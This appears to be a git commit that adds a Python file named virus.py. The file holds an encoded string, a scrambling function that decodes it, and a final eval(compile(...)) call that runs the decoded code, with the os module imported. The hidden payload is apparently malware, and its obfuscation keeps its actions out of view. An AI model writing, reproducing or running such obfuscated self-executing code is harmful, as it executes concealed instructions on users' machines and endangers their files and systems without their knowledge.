3d4bf6f79e13fb63794af2c5ffb1001830d18a08
Fin-GITHUB <70870542+fin-github@users.noreply.github.com>
2023-04-01 10:40:06 -0400

    Create virus.py

---
+++ virus.py
@@ -0,0 +1,16 @@
+
+import os
+def aovcpeoTwvocpvTmcvna(aocpeaTeocpvTacva):
+    aocpeaTneocpvTacva = 9
+    while aocpeaTneocpvTacva > 6:
+        aoccpeaTneocpvTacva = aocpeaTeocpvTacva.copy()
+        for aovcpeaTneocpvTacva in range(len(aocpeaTeocpvTacva)):
+            aoccpeaTneocpvTacva[aovcpeaTneocpvTacva] = aocpeaTeocpvTacva[len(aocpeaTeocpvTacva) - aovcpeaTneocpvTacva - 1] + 3
+        aocpeaTeocpvTacva = aoccpeaTneocpvTacva
+        aocpeaTneocpvTacva -= 1
+    return aocpeaTeocpvTacva
+aovcpeaTneocpvTacvna = r""" Te`XdRkZ`[i`[c`]i`[mditfig\c`]1e`Xdr4kZ`[i`[\efE4\lcXm%]c\j1 ]c\jVVk`e`VV]\[1 e`XdjjXcZc`]i`[mdijX\mfd\ikifgd`jfdfi]VV\c`]VV4fig\c`]"""
+aovcpeoTneocpvTmcvna = bytearray(aovcpeaTneocpvTacvna, "utf-8")
+aovcpeoTnvocpvTmcvna = aovcpeoTwvocpvTmcvna(aovcpeoTneocpvTmcvna)
+aovcpeaTneocpvTmcvna = aovcpeoTnvocpvTmcvna.decode("utf-8")
+eval(compile(aovcpeaTneocpvTmcvna,'<string>','exec'))
